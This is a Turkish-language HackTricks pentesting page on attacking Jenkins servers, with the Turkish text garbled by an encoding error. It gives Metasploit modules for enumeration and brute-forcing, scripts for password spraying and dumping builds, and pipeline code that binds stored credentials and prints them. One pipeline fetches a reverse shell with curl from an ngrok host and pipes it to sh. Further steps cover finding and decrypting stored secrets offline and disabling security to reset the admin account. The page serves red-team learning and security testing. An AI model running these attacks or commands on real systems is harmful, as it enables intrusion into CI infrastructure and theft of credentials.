# Jenkins GÃ¼venliÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

Jenkins, **herhangi** bir **programlama dili** ve kaynak kodu deposu kombinasyonu iÃ§in **sÃ¼rekli entegrasyon** veya **sÃ¼rekli teslimat** (CI/CD) ortamÄ± oluÅŸturmanÄ±n basit bir yÃ¶ntemini sunan bir araÃ§tÄ±r. AyrÄ±ca, Ã§eÅŸitli rutin geliÅŸtirme gÃ¶revlerini otomatikleÅŸtirir. Jenkins, **bireysel adÄ±mlar iÃ§in betikler oluÅŸturma ihtiyacÄ±nÄ±** ortadan kaldÄ±rmasa da, tÃ¼m derleme, test ve daÄŸÄ±tÄ±m araÃ§larÄ± dizisini manuel olarak kolayca oluÅŸturulabilecek olandan daha hÄ±zlÄ± ve daha saÄŸlam bir ÅŸekilde entegre etme imkanÄ± sunar.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Kimlik DoÄŸrulamasÄ±z SayÄ±m

Kimlik doÄŸrulamasÄ± olmadan ilginÃ§ Jenkins sayfalarÄ±nÄ± aramak iÃ§in (_/people_ veya _/asynchPeople_, bu mevcut kullanÄ±cÄ±larÄ± listeler) ÅŸunlarÄ± kullanabilirsiniz:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Kimlik doÄŸrulamasÄ± gerektirmeden komutlarÄ± Ã§alÄ±ÅŸtÄ±rÄ±p Ã§alÄ±ÅŸtÄ±ramayacaÄŸÄ±nÄ±zÄ± kontrol edin:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Kimlik bilgileri olmadan _**/asynchPeople/**_ yoluna veya _**/securityRealm/user/admin/search/index?q=**_ yoluna bakarak **kullanÄ±cÄ± adlarÄ±nÄ±** gÃ¶rebilirsiniz.

Jenkins sÃ¼rÃ¼mÃ¼nÃ¼ _**/oops**_ veya _**/error**_ yolundan alabilirsiniz.

![](<../../.gitbook/assets/image (146).png>)

### Bilinen GÃ¼venlik AÃ§Ä±klarÄ±

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## GiriÅŸ

Temel bilgilerde **Jenkins'e giriÅŸ yapmanÄ±n tÃ¼m yollarÄ±nÄ±** kontrol edebilirsiniz:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KayÄ±t

Hesap oluÅŸturmanÄ±za ve iÃ§ine giriÅŸ yapmanÄ±za **izin veren Jenkins Ã¶rneklerini** bulabileceksiniz. Bu kadar basit.

### **SSO GiriÅŸi**

AyrÄ±ca, **SSO** **iÅŸlevselliÄŸi**/**eklentileri** mevcutsa, bir test hesabÄ± (yani, bir test **Github/Bitbucket hesabÄ±**) kullanarak uygulamaya **giriÅŸ yapmayÄ±** denemelisiniz. [**buradan**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) hile yapÄ±n.

### Bruteforce

**Jenkins**, **ÅŸifre politikasÄ±** ve **kullanÄ±cÄ± adÄ± brute-force Ã¶nlemesi** eksikliÄŸi vardÄ±r. **ZayÄ±f ÅŸifreler** veya **ÅŸifre olarak kullanÄ±cÄ± adlarÄ±** kullanÄ±lÄ±yor olabileceÄŸinden, kullanÄ±cÄ±larÄ± **brute-force** yapmak Ã¶nemlidir, hatta **tersine Ã§evrilmiÅŸ kullanÄ±cÄ± adlarÄ± ÅŸifre olarak** bile kullanÄ±labilir.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Åifre Spraying

[Bu python scriptini](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) veya [bu powershell scriptini](https://github.com/chryzsh/JenkinsPasswordSpray) kullanÄ±n.

### IP Beyaz Liste Bypass

BirÃ§ok organizasyon, **SaaS tabanlÄ± kaynak kontrol yÃ¶netimi (SCM) sistemleri** olan GitHub veya GitLab'Ä±, Jenkins veya TeamCity gibi **iÃ§, kendi barÄ±ndÄ±rdÄ±ÄŸÄ± CI** Ã§Ã¶zÃ¼mleri ile birleÅŸtirir. Bu yapÄ±, CI sistemlerinin **SaaS kaynak kontrol saÄŸlayÄ±cÄ±larÄ±ndan webhook olaylarÄ± almasÄ±na** olanak tanÄ±r, esasen pipeline iÅŸlerini tetiklemek iÃ§in.

Bunu baÅŸarmak iÃ§in, organizasyonlar **SCM platformlarÄ±nÄ±n IP aralÄ±klarÄ±nÄ± beyaz listeye alÄ±r**, bÃ¶ylece **webhooklar** aracÄ±lÄ±ÄŸÄ±yla **iÃ§ CI sistemine** eriÅŸim izni verir. Ancak, **herkesin** GitHub veya GitLab'da bir **hesap** oluÅŸturabileceÄŸini ve bunu **webhook tetiklemek** iÃ§in yapÄ±landÄ±rabileceÄŸini belirtmek Ã¶nemlidir; bu da **iÃ§ CI sistemine** istek gÃ¶ndermeye neden olabilir.

Kontrol edin: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale//)

## Ä°Ã§ Jenkins Suistimalleri

Bu senaryolarda Jenkins'e eriÅŸmek iÃ§in geÃ§erli bir hesabÄ±nÄ±z olduÄŸunu varsayacaÄŸÄ±z.

{% hint style="warning" %}
Jenkins'te yapÄ±landÄ±rÄ±lan **Yetkilendirme** mekanizmasÄ±na ve ele geÃ§irilen kullanÄ±cÄ±nÄ±n izinlerine baÄŸlÄ± olarak, **aÅŸaÄŸÄ±daki saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirme yeteneÄŸiniz olabilir veya olmayabilir.**
{% endhint %}

Daha fazla bilgi iÃ§in temel bilgilere bakÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KullanÄ±cÄ±larÄ± Listeleme

EÄŸer Jenkins'e eriÅŸtiyseniz, diÄŸer kayÄ±tlÄ± kullanÄ±cÄ±larÄ± [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) adresinde listeleyebilirsiniz.

### DÃ¼z Metin Gizli Bilgileri Bulmak iÃ§in YapÄ±larÄ± DÃ¶kme

DÃ¼z metin gizli bilgileri bulmak umuduyla yapÄ± konsol Ã§Ä±ktÄ±larÄ± ve yapÄ± ortam deÄŸiÅŸkenlerini dÃ¶kmek iÃ§in [bu scripti](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) kullanÄ±n.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH Kimlik Bilgilerini Ã‡alma**

EÄŸer ele geÃ§irilen kullanÄ±cÄ±nÄ±n **yeni bir Jenkins dÃ¼ÄŸÃ¼mÃ¼ oluÅŸturma/deÄŸiÅŸtirme iÃ§in yeterli yetkisi varsa** ve diÄŸer dÃ¼ÄŸÃ¼mlere eriÅŸim iÃ§in SSH kimlik bilgileri zaten saklanÄ±yorsa, bu kimlik bilgilerini **Ã§alarak** yeni bir dÃ¼ÄŸÃ¼m oluÅŸturup/deÄŸiÅŸtirerek ve **kimlik bilgilerini kaydedecek bir ana bilgisayar ayarlayarak** elde edebilir:

![](<../../.gitbook/assets/image (218).png>)

Genellikle Jenkins ssh kimlik bilgilerini **kÃ¼resel saÄŸlayÄ±cÄ±da** (`/credentials/`) bulabilirsiniz, bu nedenle diÄŸer gizli bilgileri dÃ¶kme ÅŸeklinizle bunlarÄ± da dÃ¶kebilirsiniz. Daha fazla bilgi iÃ§in [**Gizli Bilgileri DÃ¶kme BÃ¶lÃ¼mÃ¼**](./#dumping-secrets) bÃ¶lÃ¼mÃ¼ne bakÄ±n.

### **Jenkins'te RCE**

Jenkins sunucusunda **shell almak**, saldÄ±rgana tÃ¼m **gizli bilgileri** ve **env deÄŸiÅŸkenlerini** sÄ±zdÄ±rma fÄ±rsatÄ± verir ve aynÄ± aÄŸda bulunan diÄŸer makineleri **istismar etme** veya hatta **bulut kimlik bilgilerini toplama** imkanÄ± saÄŸlar.

VarsayÄ±lan olarak, Jenkins **SYSTEM olarak Ã§alÄ±ÅŸÄ±r**. Bu nedenle, onu ele geÃ§irmek saldÄ±rgana **SYSTEM ayrÄ±calÄ±klarÄ±** verecektir.

### **Proje OluÅŸturma/DeÄŸiÅŸtirme ile RCE**

Proje oluÅŸturma/deÄŸiÅŸtirme, Jenkins sunucusunda RCE elde etmenin bir yoludur:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy Script Ã‡alÄ±ÅŸtÄ±rarak RCE**

AyrÄ±ca, yeni bir proje oluÅŸturmaktan daha gizli olabilecek bir Groovy script Ã§alÄ±ÅŸtÄ±rarak RCE elde edebilirsiniz:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### Pipeline OluÅŸturma/DeÄŸiÅŸtirme ile RCE

AyrÄ±ca **pipeline oluÅŸturarak/deÄŸiÅŸtirerek RCE elde edebilirsiniz**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline Ä°stismarÄ±

Pipeline'larÄ± istismar etmek iÃ§in hala Jenkins'e eriÅŸiminiz olmasÄ± gerekir.

### Build Pipeline'lar

**Pipeline'lar**, projelerde **build mekanizmasÄ±** olarak da kullanÄ±labilir, bu durumda **depo iÃ§inde** pipeline sÃ¶zdizimini iÃ§eren bir **dosya** yapÄ±landÄ±rÄ±labilir. VarsayÄ±lan olarak `/Jenkinsfile` kullanÄ±lÄ±r:

![](<../../.gitbook/assets/image (127).png>)

AyrÄ±ca, **pipeline yapÄ±landÄ±rma dosyalarÄ±nÄ± baÅŸka yerlerde** (Ã¶rneÄŸin, diÄŸer depolarda) saklamak da mÃ¼mkÃ¼ndÃ¼r; bu, depo **eriÅŸimini** ve pipeline eriÅŸimini **ayÄ±rma** amacÄ± taÅŸÄ±r.

EÄŸer bir saldÄ±rganÄ±n **o dosya Ã¼zerinde yazma eriÅŸimi** varsa, onu **deÄŸiÅŸtirebilir** ve **pipeline'Ä± tetikleyebilir**; hatta Jenkins'e eriÅŸimi olmadan bile.\
SaldÄ±rganÄ±n **bazÄ± dal korumalarÄ±nÄ± aÅŸmasÄ±** gerekebilir (platforma ve kullanÄ±cÄ± ayrÄ±calÄ±klarÄ±na baÄŸlÄ± olarak bunlar aÅŸÄ±labilir veya aÅŸÄ±lamayabilir).

Ã–zel bir pipeline'Ä± Ã§alÄ±ÅŸtÄ±rmak iÃ§in en yaygÄ±n tetikleyiciler ÅŸunlardÄ±r:

* **Ana dal iÃ§in Pull request** (veya potansiyel olarak diÄŸer dallar iÃ§in)
* **Ana dala Push** (veya potansiyel olarak diÄŸer dallar iÃ§in)
* **Ana dalÄ± gÃ¼ncelleyin** ve bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± bekleyin

{% hint style="info" %}
EÄŸer bir **harici kullanÄ±cÄ±ysanÄ±z**, baÅŸka bir **kullanÄ±cÄ±/organizasyonun** reposunun **ana dalÄ±na PR oluÅŸturmayÄ±** ve **pipeline'Ä± tetiklemeyi** beklememelisiniz... ama eÄŸer **kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa**, bunu istismar ederek ÅŸirketleri tamamen **tehdit edebilirsiniz**.
{% endhint %}

### Pipeline RCE

Ã–nceki RCE bÃ¶lÃ¼mÃ¼nde, [**pipeline'Ä± deÄŸiÅŸtirerek RCE elde etme**](./#rce-creating-modifying-pipeline) tekniÄŸi zaten belirtilmiÅŸti.

### Env DeÄŸiÅŸkenlerini Kontrol Etme

TÃ¼m pipeline iÃ§in veya belirli aÅŸamalar iÃ§in **dÃ¼z metin env deÄŸiÅŸkenleri** tanÄ±mlamak mÃ¼mkÃ¼ndÃ¼r. Bu env deÄŸiÅŸkenleri **hassas bilgi iÃ§ermemelidir**, ancak bir saldÄ±rgan her zaman **tÃ¼m pipeline** yapÄ±landÄ±rmalarÄ±nÄ±/Jenkinsfile'larÄ± kontrol edebilir:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Gizli bilgileri dÃ¶kme

Jenkins'in gizli bilgileri genellikle nasÄ±l ele aldÄ±ÄŸÄ± hakkÄ±nda bilgi iÃ§in temel bilgilere gÃ¶z atÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Kimlik bilgileri **kÃ¼resel saÄŸlayÄ±cÄ±lara** (`/credentials/`) veya **belirli projelere** (`/job/<project-name>/configure`) **ait olabilir**. Bu nedenle, hepsini dÄ±ÅŸarÄ± aktarmak iÃ§in **gizli bilgileri iÃ§eren tÃ¼m projeleri en azÄ±ndan ele geÃ§irmeniz** ve Ã¶zel/zehirli boru hatlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±z gerekir.

BaÅŸka bir sorun var, bir boru hattÄ±nÄ±n **env**'sinde bir **gizli bilgi** almak iÃ§in **gizli bilginin adÄ±nÄ± ve tÃ¼rÃ¼nÃ¼ bilmeniz** gerekir. Ã–rneÄŸin, bir **`usernamePassword`** **gizli bilgisini** **`string`** **gizli bilgisi** olarak **yÃ¼klemeye** Ã§alÄ±ÅŸÄ±rsanÄ±z bu **hata** ile karÅŸÄ±laÅŸÄ±rsÄ±nÄ±z:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Burada bazÄ± yaygÄ±n gizli tÃ¼rlerini yÃ¼klemenin yolu var:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
SayfanÄ±n sonunda **tÃ¼m kimlik bilgisi tÃ¼rlerini** bulabilirsiniz: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
TÃ¼m **gizli bilgileri bir kerede dÃ¶kmenin** en iyi yolu, **Jenkins** makinesini **tehdit altÄ±na almak**tÄ±r (Ã¶rneÄŸin, **yerleÅŸik dÃ¼ÄŸÃ¼m**de ters bir shell Ã§alÄ±ÅŸtÄ±rmak) ve ardÄ±ndan **master anahtarlarÄ±nÄ±** ve **ÅŸifrelenmiÅŸ gizli bilgileri** sÄ±zdÄ±rmak ve bunlarÄ± Ã§evrimdÄ±ÅŸÄ± olarak Ã§Ã¶zmektir.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [DÃ¼ÄŸÃ¼mler & Ajanlar bÃ¶lÃ¼mÃ¼ne](./#nodes-and-agents) ve [SonrasÄ± SÃ¶mÃ¼rÃ¼ bÃ¶lÃ¼mÃ¼ne](./#post-exploitation) bakÄ±n.
{% endhint %}

### Tetikleyiciler

[Belgelerden](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` direktifi, Pipeline'Ä±n **otomatik olarak yeniden tetiklenmesi gereken yollarÄ±** tanÄ±mlar. GitHub veya BitBucket gibi bir kaynakla entegre olan Pipelinelar iÃ§in, `triggers` gerekli olmayabilir Ã§Ã¼nkÃ¼ webhook tabanlÄ± entegrasyon zaten mevcut olabilir. Mevcut tetikleyiciler `cron`, `pollSCM` ve `upstream`'dir.

Cron Ã¶rneÄŸi:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **diÄŸer Ã¶rnekleri belgelerde**.

### DÃ¼ÄŸÃ¼mler & Ajanlar

Bir **Jenkins Ã¶rneÄŸi**, **farklÄ± makinelerde Ã§alÄ±ÅŸan farklÄ± ajanlara** sahip olabilir. Bir saldÄ±rgan perspektifinden, farklÄ± makinelere eriÅŸim, **Ã§alÄ±ntÄ± potansiyel bulut kimlik bilgileri** veya **diÄŸer makineleri istismar etmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek farklÄ± aÄŸ eriÅŸimi** anlamÄ±na gelir.

Daha fazla bilgi iÃ§in temel bilgilere bakÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**YapÄ±landÄ±rÄ±lmÄ±ÅŸ dÃ¼ÄŸÃ¼mleri** `/computer/` iÃ§inde listeleyebilirsiniz, genellikle **`YerleÅŸik DÃ¼ÄŸÃ¼m`** (Jenkins'i Ã§alÄ±ÅŸtÄ±ran dÃ¼ÄŸÃ¼m) ve potansiyel olarak daha fazlasÄ±nÄ± bulacaksÄ±nÄ±z:

![](<../../.gitbook/assets/image (249).png>)

**YerleÅŸik dÃ¼ÄŸÃ¼mÃ¼ ele geÃ§irmek** Ã¶zellikle ilginÃ§tir Ã§Ã¼nkÃ¼ hassas Jenkins bilgilerini iÃ§erir.

**YerleÅŸik Jenkins dÃ¼ÄŸÃ¼mÃ¼nde** **pipeline'Ä±** **Ã§alÄ±ÅŸtÄ±rmak** istediÄŸinizi belirtmek iÃ§in pipeline iÃ§inde aÅŸaÄŸÄ±daki yapÄ±landÄ±rmayÄ± belirtebilirsiniz:
```bash
pipeline {
agent {label 'built-in'}
```
### Tam Ã¶rnek

Belirli bir ajan iÃ§inde, bir cron tetikleyicisi ile, pipeline ve aÅŸama ortam deÄŸiÅŸkenleri ile, bir adÄ±mda 2 deÄŸiÅŸken yÃ¼kleyerek ve ters shell gÃ¶ndererek:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Gizli AnahtarlarÄ±

Yeterli izinleriniz varsa `/credentials/` eriÅŸerek gizli anahtarlarÄ± listeleyebilirsiniz. Bu, yalnÄ±zca `credentials.xml` dosyasÄ±ndaki gizli anahtarlarÄ± listeleyecektir, ancak **build yapÄ±landÄ±rma dosyalarÄ±** da **daha fazla gizli anahtar** iÃ§erebilir.

EÄŸer **her projenin yapÄ±landÄ±rmasÄ±nÄ± gÃ¶rebiliyorsanÄ±z**, orada **depo eriÅŸimi iÃ§in kullanÄ±lan gizli anahtarlarÄ±n (gizli anahtarlar)** ve **projenin diÄŸer gizli anahtarlarÄ±nÄ±n** isimlerini de gÃ¶rebilirsiniz.

![](<../../.gitbook/assets/image (180).png>)

#### Groovy'den

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Diskten

Bu dosyalar **Jenkins gizli anahtarlarÄ±nÄ± ÅŸifre Ã§Ã¶zmek iÃ§in** gereklidir:

* secrets/master.key
* secrets/hudson.util.Secret

BÃ¶yle **gizli anahtarlar genellikle** ÅŸurada bulunabilir:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

OnlarÄ± bulmak iÃ§in bir regex:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins sÄ±rlarÄ±nÄ± Ã§evrimdÄ±ÅŸÄ± Ã§Ã¶z

EÄŸer **sÄ±rlarÄ± Ã§Ã¶zmek iÃ§in gerekli ÅŸifreleri dÃ¶kÃ¼mlediyseniz**, **bu scripti** kullanarak **o sÄ±rlarÄ± Ã§Ã¶zebilirsiniz**. [**bu script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy'den Jenkins sÄ±rlarÄ±nÄ± Ã§Ã¶zme
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Yeni admin kullanÄ±cÄ±sÄ± oluÅŸtur

1. `/var/lib/jenkins/config.xml` veya `C:\Program Files (x86)\Jenkins\` iÃ§indeki Jenkins config.xml dosyasÄ±na eriÅŸin.
2. `<useSecurity>true</useSecurity>` kelimesini arayÄ±n ve **`true`** kelimesini **`false`** olarak deÄŸiÅŸtirin.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** sunucusunu **yeniden baÅŸlatÄ±n**: `service jenkins restart`
4. Åimdi Jenkins portalÄ±na tekrar gidin ve bu sefer **Jenkins herhangi bir kimlik bilgisi istemeyecek**. **YÃ¶netim Jenkins** bÃ¶lÃ¼mÃ¼ne giderek **yÃ¶netici ÅŸifresini tekrar ayarlayÄ±n**.
5. AyarlarÄ± `<useSecurity>true</useSecurity>` olarak deÄŸiÅŸtirerek **gÃ¼venliÄŸi tekrar etkinleÅŸtirin** ve **Jenkins'i tekrar baÅŸlatÄ±n**.

## Referanslar

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
